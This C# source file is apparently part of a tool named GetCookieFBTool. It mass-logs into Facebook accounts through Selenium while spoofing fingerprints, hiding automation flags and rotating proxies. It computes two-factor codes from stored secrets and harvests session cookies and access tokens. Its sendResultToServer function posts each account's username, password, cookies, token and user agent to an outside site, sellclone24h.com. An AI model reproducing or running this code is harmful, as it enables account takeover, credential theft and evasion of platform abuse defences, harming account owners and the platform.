using System;
using System.Collections.Generic;
using System.Collections.ObjectModel;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Xml.Linq;
using GetCookieFBTool.HelperLibrary.Facebook;
using GetCookieFBTool.HelperLibrary.HelperProxy;
using Newtonsoft.Json.Linq;
using OpenQA.Selenium;
using OpenQA.Selenium.Chrome;
using OpenQA.Selenium.Chrome.ChromeDriverExtensions;
using OtpNet;
using RestSharp;
using System.Net.NetworkInformation;
using System.Windows.Forms;
using xNet;
using static System.Windows.Forms.VisualStyles.VisualStyleElement;
using System.Net;
using System.Security.Principal;
using static System.Net.WebRequestMethods;

namespace GetCookieFBTool.HelperLibrary.Facebook
{
    internal class Core
    {
        public static void InitModeHide(Account account)
        {
            var options = new ChromeOptions();
            options.AddArgument("--window-position=-32000,-32000");
            options.AddArgument("--headless");
            options.AddArgument("ignore-certificate-errors");

            Init(account, options);
        }

        public static void InitModeShowAll(Account account)
        {
            var options = new ChromeOptions();
            options.AddArgument("--window-size=400,800");
            //options.AddArgument("--headless");
            options.AddArgument("ignore-certificate-errors");
            Init(account, options);
        }

        public static void InitModeShowTaskbar(Account account)
        {
            var options = new ChromeOptions();
            options.AddArgument("--window-position=-32000,-32000");
            //options.AddArgument("--headless");
            options.AddArgument("ignore-certificate-errors");
            Init(account, options);
        }

        public static void Init(Account account, ChromeOptions options)
        {

            // remove bar
            options.AddExcludedArgument("enable-automation");
            options.AddAdditionalCapability("useAutomationExtension", false);
            options.AddArgument("--disable-web-security");
            options.AddArgument("--disable-blink-features=AutomationControlled");
            options.AddArgument("--no-sandbox");
            options.AddArgument("--start-maximized");
            options.AddUserProfilePreference("credentials_enable_service", false);
            options.AddUserProfilePreference("profile.password_manager_enabled", false);

            //userAgent
            string userAgent = null;
            string new_proxy = "";
            if (FacebookInstances.fakeUserAgent)
            {

                FacebookInstances.queueFakeUserAgent.TryDequeue(out userAgent);
                if (userAgent != null)
                {
                    options.AddArgument("--user-agent=" + userAgent);
                    FacebookInstances.queueFakeUserAgent.Enqueue(userAgent);
                }

                //var fakeChromeVersion = "108.0.";
                //Random random = new Random();
                //int a1 = random.Next(1, 9999);

                //int a2 = random.Next(1, 999);
                //if(a1.ToString().Length < 4)
                //{
                //    string randomA1 = "";
                //    for(int i = 0; i< 4 - a1.ToString().Length; i++)
                //    {
                //        randomA1 += "0";
                //    }
                //    randomA1 += a1.ToString();
                //    fakeChromeVersion += randomA1 + ".";
                //}
                //else
                //{
                //    fakeChromeVersion += a1.ToString() + ".";
                //}

                //if (a2.ToString().Length < 3)
                //{
                //    string randomA2 = "";
                //    for (int i = 0; i < 3 - a2.ToString().Length; i++)
                //    {
                //        randomA2 += "0";
                //    }
                //    randomA2 += a2.ToString();
                //    fakeChromeVersion += randomA2;
                //}
                //else
                //{
                //    fakeChromeVersion += a2.ToString();
                //}

                //var fakeUserAgent = $"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{fakeChromeVersion} Safari/537.36";

                //options.AddArgument("--user-agent=" + fakeUserAgent);
            }

            ChromeDriver driver = null;

            try
            {
                options.AddUserProfilePreference("profile.default_content_setting_values.images", 2);
                if (FacebookInstances.addEx)
                    options.AddExtensions(AppDomain.CurrentDomain.BaseDirectory + "\\Fingerprint-Spoofing.crx");

                FacebookInstances.numRan += 1;
                //var delayTime = FacebookInstances.delayLevel * 100;

                ChromeDriverService service = ChromeDriverService.CreateDefaultService();
                service.HideCommandPromptWindow = true;

                if (ProxyInstances.userProxy == true)
                {
                    while (ProxyInstances.Http.Count == 0)
                    {
                        Thread.Sleep(5 * 1000);
                    }
                    if (!ProxyInstances.Http.TryDequeue(out new_proxy) || new_proxy == null)
                    {
                        throw new Exception("proxy empty!");
                    }
                    else
                    {
                        long currentTime = (long)DateTime.UtcNow.Subtract(new DateTime(1970, 1, 1)).TotalMilliseconds;
                        if (ProxyInstances.type == 0 || ProxyInstances.type == 1
                            || ProxyInstances.type == 4 || ProxyInstances.type == 5
                            || ProxyInstances.type == 7 || ProxyInstances.type == 8 || ProxyInstances.type == 9
                            || ProxyInstances.type == 10 || ProxyInstances.type == 11 || ProxyInstances.type == 12
                            || ProxyInstances.type == 13 || ProxyInstances.type == 14)
                        {
                            if (currentTime - ProxyInstances.beginTime <= ProxyInstances.timeUpdate)
                            {
                                ProxyInstances.Http.Enqueue(new_proxy);
                            }
                        }
                        else
                            ProxyInstances.Http.Enqueue(new_proxy);

                        if (new_proxy.Split(':').Length <= 2)
                        {
                            if (ProxyInstances.type != 10 && ProxyInstances.type != 14)
                            {
                                var proxy = new Proxy();
                                proxy.Kind = ProxyKind.Manual;
                                proxy.IsAutoDetect = false;
                                proxy.HttpProxy = new_proxy;
                                proxy.SslProxy = new_proxy;
                                proxy.SocksUserName = "";
                                proxy.SocksPassword = "";
                                options.Proxy = proxy;
                            }
                            else
                            {
                                options.AddArgument("--proxy-server=socks5://" + new_proxy);
                            }

                            driver = new ChromeDriver(service, options);
                        }
                        else
                        {
                            var eleProxy = new_proxy.Split(':');
                            options.AddHttpProxy(eleProxy[0], Int32.Parse(eleProxy[1]), eleProxy[2], eleProxy[3]);
                            driver = new ChromeDriver(service, options);
                        }
                    }
                }
                else
                {
                    driver = new ChromeDriver(service, options);
                }

                //IWebDriver driver = new ChromeDriver(options);
                driver.Manage().Timeouts().PageLoad = TimeSpan.FromSeconds(FacebookInstances.pageLoadTime);

                Thread.Sleep(FacebookInstances.delayLevel);
                if (FacebookInstances.linkFix != null && FacebookInstances.linkFix != "")
                {
                    driver.Navigate().GoToUrl(FacebookInstances.linkFix);
                    Thread.Sleep(2000);
                }

                //if (FacebookInstances.CookieSP)
                //{
                //    driver.Navigate().GoToUrl(@"https://www.facebook.com/");
                //    driver.Manage().Cookies.DeleteAllCookies();
                //    string stringCookie;
                //    FacebookInstances.cookiePrepare.TryDequeue(out stringCookie);
                //    var cookies = stringCookie.Split(';');
                //    foreach (string cookie in cookies)
                //    {
                //        if (cookie == "") break;
                //        var datacookie = cookie.Trim().Split('=');
                //        Cookie name = new Cookie(datacookie[0], datacookie[1]);
                //        driver.Manage().Cookies.AddCookie(name);
                //    }
                //    FacebookInstances.cookiePrepare.Enqueue(stringCookie);
                //}
                //if (FacebookInstances.urlType ==1)
                //{
                //    driver.Navigate().GoToUrl("https://www.facebook.com/login.php");
                //}
                //else if(FacebookInstances.urlType == 2)
                //{
                //    driver.Navigate().GoToUrl("https://www.fb.com/");
                //}

                int urlType = 0;
                string mainUrl = "";
                Random random = new Random();

                urlType = FacebookInstances.urlType;

                if (urlType != 3 && urlType != 4)
                {
                    if (FacebookInstances.urlCustom == "" || FacebookInstances.urlCustom == null)
                    {
                        if (urlType == 1)
                        {
                            mainUrl = "https://www.fb.com/";
                        }
                        else if (urlType == 2)
                        {
                            mainUrl = "https://www.fb.com/login";
                        }
                        else if (urlType == 0)
                        {
                            int indexUrl = random.Next(0, FacebookInstances.lsUrlCustom.Count());
                            mainUrl = FacebookInstances.lsUrlCustom[indexUrl];
                        }
                    }
                    else
                    {
                        mainUrl = FacebookInstances.urlCustom;
                    }
                    if (FacebookInstances.CookieSP)
                    {
                        driver.Navigate().GoToUrl(mainUrl);
                        driver.Manage().Cookies.DeleteAllCookies();
                        string stringCookie;
                        FacebookInstances.cookiePrepare.TryDequeue(out stringCookie);
                        var cookies = stringCookie.Split(';');
                        foreach (string cookie in cookies)
                        {
                            if (cookie == "") break;
                            var datacookie = cookie.Trim().Split('=');
                            if (datacookie.Length > 1)
                            {
                                OpenQA.Selenium.Cookie name = new OpenQA.Selenium.Cookie(datacookie[0], datacookie[1]);
                                driver.Manage().Cookies.AddCookie(name);
                            }

                        }
                        FacebookInstances.cookiePrepare.Enqueue(stringCookie);
                    }


                    if (FacebookInstances.AccSP)
                    {
                        driver.Navigate().GoToUrl(mainUrl);
                        //driver.Manage().Cookies.DeleteAllCookies();
                        string accPre;
                        FacebookInstances.queueAccPre.TryDequeue(out accPre);
                        var eleAccs = accPre.Split('|');
                        var userInput1 = driver.FindElement(By.Id("email"));
                        var passInput1 = driver.FindElement(By.Id("pass"));
                        var loginBtn1 = driver.FindElement(By.Name("login"));
                        userInput1.SendKeys(eleAccs[0]);
                        passInput1.SendKeys(eleAccs[1]);
                        Thread.Sleep(1 * 1000);
                        loginBtn1.Click();
                        Thread.Sleep(2 * 1000);
                        var lsCookies1 = getCookie(driver);
                        string cookies = "";
                        foreach (var cookie in lsCookies1)
                        {
                            cookies += cookie.ToString().Split(';')[0] + ";";
                        }
                        FacebookInstances.dataCookiePre.Enqueue(cookies);
                        FacebookInstances.queueAccPre.Enqueue(accPre);
                    }

                    driver.Navigate().GoToUrl(mainUrl);

                    Thread.Sleep(2 * 1000);
                    try
                    {
                        var textSpam = driver.FindElement(By.XPath("//h2[@class='accessible_elem']")).Text;
                        if (textSpam.Contains("Blocked"))
                        {
                            FacebookInstances.OnNewAccAdded(account, "spam", null, null, userAgent);
                            driver.Close();
                            driver.Quit();
                            return;
                        }
                    }
                    catch { }



                    var userInput = driver.FindElement(By.Id("email"));
                    var passInput = driver.FindElement(By.Id("pass"));
                    var loginBtn = driver.FindElement(By.Name("login"));

                    userInput.SendKeys(account.userName);
                    //Thread.Sleep(3 * 1000);
                    passInput.SendKeys(account.pass);
                    //foreach (char s in account.userName)
                    //{
                    //    userInput.SendKeys(s.ToString());
                    //    Thread.Sleep(80);
                    //}
                    //Thread.Sleep(1 * 1000);
                    //foreach (char s in account.pass)
                    //{
                    //    passInput.SendKeys(s.ToString());
                    //    Thread.Sleep(80);
                    //}
                    Thread.Sleep(1 * 1000);
                    loginBtn.Click();
                    Thread.Sleep(2 * 1000);
                    if (driver.Url.Contains("/login/?"))
                    {
                        // accessible_elem
                        FacebookInstances.OnNewAccAdded(account, "error", null, null, userAgent);
                        driver.Close();
                        driver.Quit();
                        return;
                    }

                    int checkpointCount = 0;


                    if (driver.Url.Contains("facebook.com/checkpoint/?next"))
                    {
                        if (account.key2fa != null)
                        {
                            var ele2faInput = driver.FindElement(By.Id("approvals_code"));//approvals_code
                            var secretKey = Base32Encoding.ToBytes(account.key2fa);
                            var totp = new Totp(secretKey);
                            var otp = totp.ComputeTotp();
                            ele2faInput.SendKeys(otp);
                            Thread.Sleep(1 * 1000);
                            var continueBtn = driver.FindElement(By.Id("checkpointSubmitButton"));//checkpointSubmitButton
                            continueBtn.Submit();
                            Thread.Sleep(1 * 1000);


                            while (driver.Url.Contains("facebook.com/checkpoint/?next"))
                            {
                                checkpointCount++;
                                try
                                {
                                    var notSaveBrowser = driver.FindElement(By.XPath("//*[@value='dont_save']"));
                                    if (notSaveBrowser != null)
                                    {
                                        notSaveBrowser.Click();
                                        Thread.Sleep(1 * 1000);
                                    }
                                }
                                catch (Exception e)
                                {
                                    Console.WriteLine(e.Message);
                                }
                                finally
                                {
                                    continueBtn = driver.FindElement(By.Id("checkpointSubmitButton"));
                                    continueBtn.Submit();
                                    Thread.Sleep(1 * 1000);
                                }
                                if (checkpointCount > 2)
                                {
                                    break;
                                }
                            }

                        }
                        else
                        {
                            while (driver.Url.Contains("facebook.com/checkpoint/?next"))
                            {
                                checkpointCount++;
                                try
                                {
                                    var notSaveBrowser = driver.FindElement(By.XPath("//*[@value='dont_save']"));
                                    if (notSaveBrowser != null)
                                    {
                                        notSaveBrowser.Click();
                                        Thread.Sleep(1 * 1000);
                                    }
                                }
                                catch (Exception e)
                                {
                                    Console.WriteLine(e.Message);
                                }
                                finally
                                {
                                    var continueBtn = driver.FindElement(By.Id("checkpointSubmitButton"));
                                    continueBtn.Submit();
                                    Thread.Sleep(1 * 1000);
                                }
                                if (checkpointCount > 2)
                                {
                                    break;
                                }
                            }
                        }
                    }

                    var lsCookies = getCookie(driver);
                    userAgent = getUserAgent(driver);

                    var accessToken = "";
                    if (FacebookInstances.getToken)
                        accessToken = getToken(driver);

                    if (lsCookies == null && userAgent == null)
                    {
                        FacebookInstances.OnNewAccAdded(account, "error", null, null, userAgent);
                        driver.Close();
                        driver.Quit();
                        return;
                    }
                    //else if(accessToken != null)
                    //{
                    //    string cookies = "";
                    //    foreach (var cookie in lsCookies)
                    //    {
                    //        cookies += cookie.ToString();
                    //    }
                    //    FacebookInstances.OnNewAccAdded(account, "success", cookies, accessToken, userAgent);
                    //    var data = account.userName + "|" + account.pass + "|" + cookies + "|" + userAgent + "|" + accessToken;

                    //    sendResultToServer(data, "success");
                    //}
                    else if (driver.Url.Contains("checkpoint"))
                    {
                        string cookies = "";
                        foreach (var cookie in lsCookies)
                        {
                            if (cookie.Name == "c_user" || cookie.Name == "xs" || cookie.Name == "wd" ||
                                cookie.Name == "datr" || cookie.Name == "sb" || cookie.Name == "fr" ||
                                cookie.Name == "presence" || cookie.Name == "m_page_voice" || cookie.Name == "referer" ||
                                cookie.Name == "xs" || cookie.Name == "wd" || cookie.Name == "m_pixel_ratio" ||
                                cookie.Name == "locale" || cookie.Name == "datr")
                            {
                                cookies += cookie.ToString().Split(';')[0] + ";";
                            }

                        }
                        var data = account.userName + "|" + account.pass + "|" + cookies + "|" + accessToken + "|" + userAgent + "|" + DateTime.Now.ToString("dd/MM/yyyy HH:mm:ss");
                        FacebookInstances.OnNewAccAdded(account, "checkpoint", cookies, "", userAgent);
                        sendResultToServer(data, "checkpoint");
                    }
                    else if (driver.Url.Contains("confirmemail.php?next=http"))
                    {
                        string cookies = "";
                        foreach (var cookie in lsCookies)
                        {
                            if (cookie.Name == "c_user" || cookie.Name == "xs" || cookie.Name == "wd" ||
                                cookie.Name == "datr" || cookie.Name == "sb" || cookie.Name == "fr" ||
                                cookie.Name == "presence" || cookie.Name == "m_page_voice" || cookie.Name == "referer" ||
                                cookie.Name == "xs" || cookie.Name == "wd" || cookie.Name == "m_pixel_ratio" ||
                                cookie.Name == "locale" || cookie.Name == "datr")
                            {
                                cookies += cookie.ToString().Split(';')[0] + ";";
                            }

                        }
                        var data = account.userName + "|" + account.pass + "|" + cookies + "|" + accessToken + "|" + userAgent + "|" + DateTime.Now.ToString("dd/MM/yyyy HH:mm:ss") + "|no-veri";
                        FacebookInstances.OnNewAccAdded(account, "no-veri", cookies, "", userAgent);
                        sendResultToServer(data, "success");
                    }
                    else
                    {
                        string cookies = "";

                        foreach (var cookie in lsCookies)
                        {
                            if (cookie.Name == "c_user" || cookie.Name == "xs" || cookie.Name == "wd" ||
                                cookie.Name == "datr" || cookie.Name == "sb" || cookie.Name == "fr" ||
                                cookie.Name == "presence" || cookie.Name == "m_page_voice" || cookie.Name == "referer" ||
                                cookie.Name == "xs" || cookie.Name == "wd" || cookie.Name == "m_pixel_ratio" ||
                                cookie.Name == "locale" || cookie.Name == "datr")
                            {
                                cookies += cookie.ToString().Split(';')[0] + ";";
                            }
                        }
                        if (!cookies.Contains("c_user"))
                        {
                            FacebookInstances.OnNewAccAdded(account, "lostCookies", null, null, userAgent);
                            driver.Close();
                            driver.Quit();
                            return;
                        }
                        var data = account.userName + "|" + account.pass + "|" + cookies + "|" + accessToken + "|" + userAgent + "|" + DateTime.Now.ToString("dd/MM/yyyy HH:mm:ss") + "|verify";
                        FacebookInstances.OnNewAccAdded(account, "success", cookies, "", userAgent);
                        sendResultToServer(data, "success");
                    }

                    driver.Close();
                    driver.Quit();
                }
                else
                {
                    if (urlType == 3)
                        driver.Navigate().GoToUrl("https://mbasic.facebook.com/");
                    else
                    {
                        driver.Navigate().GoToUrl("https://m.facebook.com/");
                    }
                    Thread.Sleep(1000);
                    var userInput = driver.FindElement(By.Id("m_login_email"));
                    var passInput = driver.FindElement(By.Name("pass"));
                    var loginBtn = driver.FindElement(By.Name("login"));

                    userInput.SendKeys(account.userName);
                    passInput.SendKeys(account.pass);

                    Thread.Sleep(1 * 1000);
                    loginBtn.Click();
                    Thread.Sleep(2 * 1000);

                    if (driver.Url.Contains("/login/?") || !driver.Url.Contains(".com/"))
                    {
                        // accessible_elem
                        FacebookInstances.OnNewAccAdded(account, "error", null, null, userAgent);
                        driver.Close();
                        driver.Quit();
                        return;
                    }
                    var lsCookies = getCookie(driver);
                    userAgent = getUserAgent(driver);

                    var accessToken = "";
                    if (FacebookInstances.getToken)
                        accessToken = getToken(driver);

                    if (lsCookies == null && userAgent == null)
                    {
                        FacebookInstances.OnNewAccAdded(account, "error", null, null, userAgent);
                        driver.Close();
                        driver.Quit();
                        return;
                    }

                    else if (driver.Url.Contains("checkpoint"))
                    {
                        string cookies = "";
                        foreach (var cookie in lsCookies)
                        {
                            if (cookie.Name == "c_user" || cookie.Name == "xs" || cookie.Name == "wd" ||
                                cookie.Name == "datr" || cookie.Name == "sb" || cookie.Name == "fr" ||
                                cookie.Name == "presence" || cookie.Name == "m_page_voice" || cookie.Name == "referer" ||
                                cookie.Name == "xs" || cookie.Name == "wd" || cookie.Name == "m_pixel_ratio" ||
                                cookie.Name == "locale" || cookie.Name == "datr")
                            {
                                cookies += cookie.ToString().Split(';')[0] + ";";
                            }

                        }
                        var data = account.userName + "|" + account.pass + "|" + cookies + "|" + accessToken + "|" + userAgent + "|" + DateTime.Now.ToString("dd/MM/yyyy HH:mm:ss");
                        FacebookInstances.OnNewAccAdded(account, "checkpoint", cookies, "", userAgent);
                        sendResultToServer(data, "checkpoint");
                    }
                    else
                    {
                        string cookies = "";

                        foreach (var cookie in lsCookies)
                        {
                            if (cookie.Name == "c_user" || cookie.Name == "xs" || cookie.Name == "wd" ||
                                cookie.Name == "datr" || cookie.Name == "sb" || cookie.Name == "fr" ||
                                cookie.Name == "presence" || cookie.Name == "m_page_voice" || cookie.Name == "referer" ||
                                cookie.Name == "xs" || cookie.Name == "wd" || cookie.Name == "m_pixel_ratio" ||
                                cookie.Name == "locale" || cookie.Name == "datr")
                            {
                                cookies += cookie.ToString().Split(';')[0] + ";";
                            }
                        }
                        if (!cookies.Contains("c_user"))
                        {
                            FacebookInstances.OnNewAccAdded(account, "lostCookies", null, null, userAgent);
                            driver.Close();
                            driver.Quit();
                            return;
                        }
                        var data = account.userName + "|" + account.pass + "|" + cookies + "|" + accessToken + "|" + userAgent + "|" + DateTime.Now.ToString("dd/MM/yyyy HH:mm:ss");
                        FacebookInstances.OnNewAccAdded(account, "success", cookies, "", userAgent);
                        sendResultToServer(data, "success");
                    }

                    driver.Close();
                    driver.Quit();

                }


            }
            catch (Exception e)
            {
                //var data = account.userName + "|" + account.pass;
                //sendResultToServer(data, "error");
                if (e.Message.Contains("proxy") || e.Message.Contains("name =\"login\"") || e.Message.Contains("timeout") && ProxyInstances.type == 9)
                {
                    FacebookInstances.OnNewAccAdded(account, new_proxy, null, null, userAgent);
                }
                else
                {
                    FacebookInstances.OnNewAccAdded(account, e.Message, null, null, userAgent);
                }

            }
            finally
            {
                try
                {
                    driver.Close();
                    driver.Quit();
                }
                catch
                {

                }

            }
        }

        public static ReadOnlyCollection<OpenQA.Selenium.Cookie> getCookie(IWebDriver driver)
        {
            try
            {
                // Get All available cookies
                var cookies = driver.Manage().Cookies.AllCookies;
                return cookies;

            }
            catch
            {
                return null;
            }
        }



        public static string getToken(IWebDriver driver)
        {
            try
            {
                driver.Navigate().GoToUrl(@"https://fb.com/pe");
                Thread.Sleep(3 * 1000);
                var pageSource = driver.PageSource;
                if (pageSource.Contains("window.__accessToken="))
                {
                    var beginToken = pageSource.IndexOf("window.__accessToken=");
                    pageSource = pageSource.Substring(beginToken);
                    beginToken = pageSource.IndexOf('"');
                    pageSource = pageSource.Substring(beginToken + 1);
                    var endToken = pageSource.IndexOf('"');

                    var accessToken = pageSource.Substring(0, endToken);
                    return accessToken;
                }
                else
                {
                    return null;
                }
            }
            catch
            {
                return null;
            }
        }

        public static string getUserAgent(IWebDriver driver)
        {
            try
            {
                var userAgent = ((IJavaScriptExecutor)driver).ExecuteScript("return navigator.userAgent");
                return userAgent.ToString();
            }
            catch
            {
                return null;
            }
        }

        public static void sendResultToServer(string data, string type)
        {
            var client = new RestClient("https://sellclone24h.com/clone/t_upload.php");
            client.Timeout = -1;
            var request = new RestRequest(Method.POST);
            request.AddHeader("Content-Type", "application/x-www-form-urlencoded");
            request.AddParameter("data", data);
            request.AddParameter("type", FacebookInstances.typeAcc + "-" + type);
            IRestResponse response = client.Execute(request);
            Console.WriteLine(response.Content);
        }

        public static bool PingHost(string proxy)
        {
            bool pingable = false;
            Ping pinger = null;

            try
            {
                HttpRequest httpRequest = new HttpRequest();
                httpRequest.Proxy = HttpProxyClient.Parse(proxy);
                httpRequest.ReadWriteTimeout = 15000;
                httpRequest.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.131 Safari/537.36";// Http.ChromeUserAgent();
                httpRequest.IgnoreProtocolErrors = true;
                httpRequest.SslCertificateValidatorCallback += (sender, certificate, chain, sslPolicyErrors) => true;
                var response = httpRequest.Get($"https://www.facebook.com/", null);
                if (response.IsOK)
                {
                    pingable = true;
                }

            }
            catch (Exception ex)
            {
                return pingable;
            }

            return pingable;
        }
        public static string CookieStrFrom(CookieContainer container, string domain)
        {
            Uri uri = new Uri(domain);
            string ck = string.Empty;
            var cookies = container.GetCookies(uri);
            foreach (System.Net.Cookie cookie in cookies)
            {
                // concat your string or do what you want
                ck += cookie.Name + "=" + cookie.Value + ";";
            }
            return ck;
        }

        public static void requestMbasicLogin(Account account)
        {
            try
            {
                var client = new RestClient("https://mbasic.facebook.com/login/device-based/regular/login/?shbl=1&refsrc=deprecated");
                client.Timeout = -1;
                var request = new RestRequest(Method.POST);
                request.AddHeader("authority", "mbasic.facebook.com");
                request.AddHeader("accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9");
                request.AddHeader("accept-language", "en-US,en;q=0.9");
                request.AddHeader("cache-control", "max-age=0");
                request.AddHeader("content-type", "application/x-www-form-urlencoded");

                request.AddHeader("origin", "https://mbasic.facebook.com");

                request.AddHeader("sec-ch-ua", "\"Not?A_Brand\";v=\"8\", \"Chromium\";v=\"108\", \"Google Chrome\";v=\"108\"");
                request.AddHeader("sec-ch-ua-mobile", "?0");
                request.AddHeader("sec-ch-ua-platform", "\"Windows\"");
                request.AddHeader("sec-fetch-dest", "document");
                request.AddHeader("sec-fetch-mode", "navigate");
                request.AddHeader("sec-fetch-site", "same-origin");
                request.AddHeader("sec-fetch-user", "?1");
                request.AddHeader("upgrade-insecure-requests", "1");
                client.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36";
                request.AddParameter("lsd", "AVpQAaxvZJM");
                request.AddParameter("jazoest", "2985");
                request.AddParameter("m_ts", "1672136643");
                request.AddParameter("li", "aceqY2DP7aRcE3DeSVFP43Xf");
                request.AddParameter("try_number", "0");
                request.AddParameter("unrecognized_tries", "0");
                request.AddParameter("email", account.userName);
                request.AddParameter("pass", account.pass);
                request.AddParameter("login", "Log+In");
                request.AddParameter("bi_xrwh", "0");
                IRestResponse response = client.Execute(request);


                string stringCookie = CookieStrFrom(client.CookieContainer, "https://mbasic.facebook.com");
                var cookies = stringCookie.Split(';');

                ChromeDriver driver = null;
                var options = new ChromeOptions();
                options.AddArgument("--window-size=400,800");
                //options.AddArgument("--headless");
                options.AddArgument("ignore-certificate-errors");

                options.AddExcludedArgument("enable-automation");
                options.AddAdditionalCapability("useAutomationExtension", false);
                options.AddArgument("--disable-web-security");
                options.AddArgument("--disable-blink-features=AutomationControlled");
                options.AddArgument("--no-sandbox");
                options.AddArgument("--start-maximized");
                options.AddUserProfilePreference("credentials_enable_service", false);
                options.AddUserProfilePreference("profile.password_manager_enabled", false);

                ChromeDriverService service = ChromeDriverService.CreateDefaultService();
                service.HideCommandPromptWindow = true;
                driver = new ChromeDriver(service, options);

                foreach (string cookie in cookies)
                {
                    if (cookie == "") break;
                    var datacookie = cookie.Trim().Split('=');
                    OpenQA.Selenium.Cookie name = new OpenQA.Selenium.Cookie(datacookie[0], datacookie[1]);
                    driver.Manage().Cookies.AddCookie(name);
                }

                driver.Navigate().GoToUrl("https://mbasic.facebook.com");
            }
            catch { }
        }

    }
}
